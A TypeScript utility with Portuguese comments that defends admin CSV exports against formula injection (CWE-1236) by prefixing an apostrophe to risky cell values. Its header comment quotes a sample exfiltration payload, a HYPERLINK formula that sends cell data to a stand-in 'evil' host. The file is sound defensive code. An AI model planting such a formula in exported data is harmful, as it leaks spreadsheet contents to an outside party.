// Proteção contra CSV/Formula Injection (CWE-1236).
//
// Excel, LibreOffice e Google Sheets executam como fórmula qualquer célula que
// comece com `=`, `+`, `-`, `@`, TAB ou CR. Campos preenchidos por clientes
// (nome, razão social, endereço, observações) chegam aos CSVs do admin — um
// valor como `=HYPERLINK("https://evil/?"&A1,"clique")` vazaria dados ao abrir.
// Solução padrão OWASP: prefixar com apóstrofo, que força a célula a texto.
// Números legítimos (inclusive negativos, ex.: `-12.50`) NÃO são alterados.

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)*$/;

export function neutralizeCsvFormula(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "number" || typeof value === "bigint" || typeof value === "boolean") {
    return String(value);
  }
  const s = String(value);
  if (!FORMULA_START.test(s)) return s;
  if (PLAIN_NUMBER.test(s)) return s;
  return `'${s}`;
}
